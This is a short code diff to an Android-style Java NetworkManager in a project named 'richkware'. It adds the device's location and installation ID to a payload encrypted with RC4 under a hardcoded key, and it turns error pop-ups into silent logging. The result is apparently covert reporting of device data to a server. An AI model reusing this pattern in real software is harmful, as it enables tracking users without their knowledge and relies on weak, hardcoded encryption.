@@ -15,6 +15,7 @@ import it.richkmeli.richkware.component.notification.NotificationType;
 import it.richkmeli.richkware.storage.StorageKey;
 import it.richkmeli.richkware.storage.StorageManager;
 import it.richkmeli.richkware.system.device.DeviceInfo;
+import it.richkmeli.richkware.util.Logger;
 
 public class NetworkManager {
     private Network network;
@@ -34,6 +35,8 @@ public class NetworkManager {
             JSONObject dataPayload = new JSONObject();
             dataPayload.put("serverPort", "none");
             dataPayload.put("associatedUser", "richk@i.it");
+            dataPayload.put("location", StorageManager.read(context, StorageKey.LOCATION));
+            dataPayload.put("installationId", StorageManager.read(context, StorageKey.INSTALLATION_ID));
             payload.put("data", RC4.encrypt(dataPayload.toString(), "richktest"));
             // channel
             payload.put("channel", "richkware");
@@ -58,8 +61,7 @@ public class NetworkManager {
                 }
             });
         } catch (Exception e) {
-            NotificationManager.notify(context, NotificationType.TOAST_SHORT, e.getMessage());
-            e.printStackTrace();
+            Logger.error(e);
         }
     }
 
